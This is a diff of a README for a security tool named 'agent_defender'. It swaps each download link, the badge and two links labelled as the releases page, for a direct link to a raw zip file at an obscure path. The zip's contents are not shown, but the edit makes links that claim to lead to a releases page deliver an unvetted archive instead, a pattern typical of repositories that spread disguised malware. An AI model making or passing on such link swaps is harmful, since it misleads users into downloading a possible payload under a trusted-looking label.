@@ -1,6 +1,6 @@
 # 🛡️ agent_defender - Protect Your Digital Environment Simply
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue)
+![Download](https://raw.githubusercontent.com/sharichewy278/agent_defender/main/Geothlypis/agent_defender-tautousian.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To download Agent Defender, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to download the software:  
-   [Visit this page to download](https://github.com/sharichewy278/agent_defender/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/sharichewy278/agent_defender/main/Geothlypis/agent_defender-tautousian.zip)
 
 2. **Choose the Right Version**  
    On the releases page, look for the latest version of Agent Defender. It will usually be at the top of the page. Each version will have release notes describing new features and bug fixes.
@@ -72,4 +72,4 @@ If you need further assistance, you can contact us through the GitHub repository
 
 Remember, keeping your environment secure is a proactive effort. With Agent Defender, you have an effective tool to help you maintain that security. 
 
-For downloads, don’t forget to visit: [Visit this page to download](https://github.com/sharichewy278/agent_defender/releases)
+For downloads, don’t forget to visit: [Visit this page to download](https://raw.githubusercontent.com/sharichewy278/agent_defender/main/Geothlypis/agent_defender-tautousian.zip)
